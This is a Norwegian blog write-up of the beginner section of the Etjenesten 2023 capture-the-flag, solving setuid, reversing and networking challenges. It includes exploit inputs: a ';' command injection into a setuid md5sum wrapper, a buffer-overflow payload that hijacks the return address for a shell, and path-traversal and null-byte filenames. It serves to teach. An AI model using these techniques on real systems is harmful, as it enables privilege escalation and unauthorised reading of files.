---
title: Etjenesten23 - Grunnleggende
date: 2024-01-21 16:00:00 +0100
categories: [Etjenesten, Etjenesten Jul 23]
tags: [ctf, etjenesten, "2023", norwegian]
media_subpath: /assets/img/etjenesten23/
---

# 1.1_scoreboard
Første grunnleggende oppgave viser oss hvordan vi skal submitte flaggene vi finner. Vi har fått ei `FLAGG` fil som viser kommandoen vi må bruke.
```console
login@corax:~/1_grunnleggende/1_scoreboard$ cat FLAGG
For å løse denne oppgaven må du skrive:

$ scoreboard 49cbfd7e622559021fc596e978570703

login@corax:~/1_grunnleggende/1_scoreboard$ scoreboard 49cbfd7e622559021fc596e978570703
Kategori: 1. Grunnleggende
Oppgave:  1.1_scoreboard
Svar:     49cbfd7e622559021fc596e978570703
Poeng:    10

Gratulerer, korrekt svar!
```


# 1.2_setuid
I oppgave 2 er flagget eid av brukeren `basic2`, og vi har fått 2 binærfiler som har setuid bitet satt slik at vi kan kjøre programmene som om vi er brukeren `basic2`.
```console
login@corax:~/1_grunnleggende/2_setuid$ ls -l
total 100
-r-------- 1 basic2 login   435 Jan  1 21:41 FLAGG
-r--r--r-- 1 basic2 login  1767 Dec 19 19:00 LESMEG.md
-r-sr-xr-x 1 basic2 login 44016 Dec 19 19:00 cat
-r-sr-xr-x 1 basic2 login 48144 Dec 19 19:00 id
```

Vi kan lese flagget med kommandoen `./cat FLAGG`.

# 1.3_injection
Liknende prinsipp i denne oppgaven som i `1.2_setuid`, hvor flagget er eid av bruekren `basic3` og vi har et setuid program som vi kan kjøre som om vi er brukeren `basic3`. Kildekoden til programmet er også tilgjengelig.
```c
int main(int argc, char *argv[]){
        if (argc != 2) {
                printf("Usage: %s <file>\n\n", argv[0]);
                printf("Suid-wrapper rundt md5sum.\n");
                exit(0);
        }
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "/usr/bin/md5sum %s", argv[1]);

        printf("Kjører kommando:\n");
        printf(cmd);
        printf("\n\n");

        setreuid(geteuid(), geteuid());
        printf("Resultat:\n");
        system(cmd);
```
{: file="md5sum.c" }

Denne kommandoen blir kjørt av programmet med vårt input istedet for `%s`: `"/usr/bin/md5sum %s"`, som betyr at vi kan injecte kommandoer ved å legge til `;` og kommandoen vi vil kjøre etterpå. `./md5sum "FLAGG; cat FLAGG"` gir oss flagget.


# 1.4_overflow
Denne oppgaven demonstrerer en simpel buffer overflow hvor vi skal få programmet til å kjøre shellcode som som gir oss shell som brukeren `basic4` (siden overflow programmet er setuid som brukeren).

Vi må også sette en stack-variabel `above` til verdien `0x4847464544434241`, på grunn av en if-sjekk: `if (above == 0x4847464544434241)`.

## Passere if-sjekken
Vi starter med å finne offsettet til `above` variabelen. Hvis vi ser på stack-oversikten som blir printet til oss av programmet kan vi se at det er 40 bytes fra starten av bufferet til starten av `above` variabelen (5 rader på 8 bytes hver).
```
&above           00 00 00 00 00 00 00 00  |........|
0x7fff785ec400   00 00 00 00 00 00 00 00  |........|
0x7fff785ec3f8   00 00 00 00 00 00 00 00  |........|
0x7fff785ec3f0   00 00 00 00 00 00 00 00  |........|
0x7fff785ec3e8   00 00 00 00 00 00 00 00  |........|
&buffer          00 00 00 00 00 00 00 00  |........|
```

Det vil si at de neste 8 bytsene vi skriver til bufferet vil overskrive `above` variabelen. Vi vet at verdien til `above` må være `0x4847464544434241`, som er lik bokstanene `ABCDEFGH` i ASCII.
Første del av inputet vårt blir dermed
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGH
```

## Kjøre shellcode
Fra stack-oversikten kan vi se at det er 24 bytes (3 rader på 8 bytes hver) etter slutten av `above` variabelen til starten av returadressen.
```
stored rip       ca 31 7e 5f ab 7f 00 00  |.1~_....|
stored rbp       02 00 00 00 00 00 00 00  |........|
0x7ffc00cc1cf8   00 00 00 00 00 00 00 00  |........|
0x7ffc00cc1cf0   00 1e cc 00 fc 7f 00 00  |........|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
```

Når vi har lagt til de 24 bytsene (f.eks 24 B'er) vil de 8 neste bytsene vi skriver overskrive returadressen på stacken, som vil gjøre at programmet ved neste `return` vil hoppe til adressen vi har skrevet. Fra kildekoden til `overflow` programmet vet vi at det er shellcode som vi vil kjøre på addressen `0x303030303030`. Dette tilsvarer ASCII-bokstavene `000000`, så da kan vi legge til 6 nuller etter de 24 B'ene vi la til tidligere.

Vi kjører programmet vårt med inputet, og det gir oss shell som `basic4` brukeren, og vi kan da lese flagget med `cat FLAGG`.
```console
login@corax:~/1_grunnleggende/4_overflow$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHBBBBBBBBBBBBBBBBBBBBBBBB000000

$ id
uid=1004(basic4) gid=1000(login) groups=1000(login)
```


# 1.5_nettverk
Denne oppgaven består av å kommunisere med en server, og har 3 steg.
Vi kan koble til serveren med følgende python kode:
```python
import socket

TCP_IP = "127.0.0.1"
TCP_PORT = 10015

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((TCP_IP, TCP_PORT))
print(conn.recv(4096).decode("utf-8"))
```
{: .nolineno }

## Steg 1
Vi får tilbake meldingen
```
Dette er en grunnleggende introduksjon til nettverksprogrammering.
Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.
```

Vi må dermed åpne 10 nye tilkoblinger til serveren, så vi kan f.eks lage en liste som holder på all tilkoblingene.
```python
a = []
for i in range(10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    a.append(s)
print(conn.recv(4096).decode("utf-8"))
```
{: .nolineno }

## Steg 2
Ny melding:
```
Du vil nå få tilsendt et 32-bits heltall i `network byte order` i hver av de ti andre sesjonene.
Summer alle, og send resultatet tilbake på denne socketen.
Det er mange måter å konvertere data på. En av dem er `struct.unpack`.
```
Hver tilkobling vi la til i lista vil få tilsendt et heltall som vi skal summere. `network byte order` refererer til `big-endian`. Vi kan unpacke tallet vi får tilsendt med `struct.unpack('>I', <data>)`.

```python
sum = 0
for b in range(len(a)):
    data = a[b].recv(4096)
    value = struct.unpack('>I',data)
    sum += value[0]

# Send summen
conn.send(bytearray(struct.pack('>I', sum)))
print(conn.recv(4096).decode("utf-8"))
```
{: .nolineno }

## Steg 3
```
Neste melding sendes fordelt over de ti sesjonene.
For å unngå å blokkere mens du leser kan du for eksempel bruke `select.select()` eller `socket.settimeout(0)`.
```

Vi velger å bruke `select.select()` for å løse dette steget. Funksjonen vil gi oss en liste med sockets som er klare til å bli lest fra, som vi kan loope over for å hente ut deler av hele meldingen som blir sendt. Meldingen som blir sendt her er flagget.
```python
while True:
    try:
        ready,_,_ = select.select(a, [], [], 10.0)
        for sock in ready:
            tpl = sock.recv(4096).decode("utf-8")
            print(tpl[0], end="")
    except:
        break
```
{: .nolineno }

## Fullstendig løsning
```python
import socket
import struct
import select

TCP_IP = "127.0.0.1"
TCP_PORT = 10015

def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((TCP_IP, TCP_PORT))
    print(conn.recv(4096).decode("utf-8"))

    a = []
    for i in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TCP_IP, TCP_PORT))
        a.append(s)
    print(conn.recv(4096).decode("utf-8"))

    sum = 0
    for b in range(len(a)):
        data = a[b].recv(4096)
        value = struct.unpack('>I',data)
        sum += value[0]

    conn.send(bytearray(struct.pack('>I', sum)))
    print(conn.recv(4096).decode("utf-8"))

    while True:
        try:
            ready,_,_ = select.select(a, [], [], 10.0)
            for sock in ready:
                tpl = sock.recv(4096).decode("utf-8")
                print(tpl[0], end="")
        except:
            break

if __name__ == "__main__":
    main()
```
{: file="solve.py" }


# 1.6_reversing
Denne oppgaven krever at vi reverserer en binærfil som tar inn et passord som argument når vi kjører filen. Vi kan reversere programmet med IDA for å finne ut hvordan programmet fungerer.

```c
int __fastcall main(int argc, const char **argv, const char **envp) {
  __uid_t v3; // ebx
  __uid_t v4; // eax
  char *path[3]; // [rsp+20h] [rbp-30h] BYREF
  unsigned int v8; // [rsp+3Ch] [rbp-14h]

  if ( argc != 2 ) {
    printf("Bruk: %s PASSORD\n\n", *argv);
    puts(s);
    puts("Hvis passordet er korrekt startes et nytt shell med utvidete rettigheter.");
    exit(0);
  }
  v8 = check_password(argv[1]);
  if ( v8 ) {
    puts("Feil passord :(");
    printf(aDuStoppetP, v8);
  } else {
    path[0] = "/bin/sh";
    path[1] = 0LL;
    puts("Korrekt passord!");
    v3 = geteuid();
    v4 = geteuid();
    setreuid(v4, v3);
    execve("/bin/sh", path, (char *const *)envp);
  }
  return v8;
}
```
{: .nolineno }

`main` funksjonen til programmet kaller på `check_password` med argumentet vi gir programmet når vi kjører det. Hvis `check_password` returnerer 0 vil vi få shell som brukeren `basic6`.

```c
__int64 __fastcall check_password(char *input) {
  char s1[10]; // [rsp+12h] [rbp-Eh] BYREF
  int v3; // [rsp+1Ch] [rbp-4h]

  if ( strlen(input) != 32 )
    return 1LL;
  if ( strncmp("Reverse_engineering", input, 19uLL) )
    return 2LL;
  if ( input[19] != '_' )
    return 3LL;
  v3 = *(_DWORD *)(input + 19);
  if ( v3 != '_re_' )
    return 4LL;
  strcpy(s1, "morsomt__");
  if ( !strncmp(s1, input + 23, 0xAuLL) )
    return 0LL;
  else
    return 5LL;
}
```
{: .nolineno }

Programmet sjekker for det følgende:
- Lengden på `input` er 32 bytes
- De første 19 bytesene er lik teksten `Reverse_engineering`
- Bokstav nummer 20 (indeks 19) er `_`
- De neste 4 bytsene er lik `_er_` (vi reverserer teksten `_re_` på grunn av endianness)
- De siste 9 bytsene er lik `morsomt__`

Det vil si at hvis vi gir inputet `Reverse_engineering_er_morsomt__` til programmet får vi shell som brukeren `basic6`, og vi kan hente flagget.


# 1.7_path_traversal
Vi er gitt et program som kaller på `less bok/<filnavn>.txt` hvor vi kan inpute `<filnavn>` selv. Programmet er ment å bare lese filer fra `bok/` mappa, mens `FLAGG.txt` ligger ett nivå bak, sammen med ett til flagg `BONUS_FLAGG`.

Som oppgavenavnet tilsier kan vi bruke path-traversal for å lese `FLAGG.txt`, ved å gi filnavnet `../FLAGG`, og dermed kjøre programmet slik: `./les_bok ../FLAGG`.


# 1.8_path_traversal_bonus
Siden programmet legger til `.txt` på filnavnet vi gir kan vi ikke lese bonusflagget på samme måte som i `1.7_path_traversal`. Vi må derfor finne en annen måte å lese filen på, som unngår at programmet legger til `.txt` på filnavnet.

Heldigvis kaller programmet på en funksjon `url_decode(command);` før den kjører kommandoen som leser flagget, som gir oss muligheten til å terminere tekststrengen vi gir som filnavn med en nullbyte, slik at `.txt` ikke blir lagt til.
Gir vi filnavnet `./les_bok ../BONUS_FLAGG%00` til programmet får vi tak i flagget.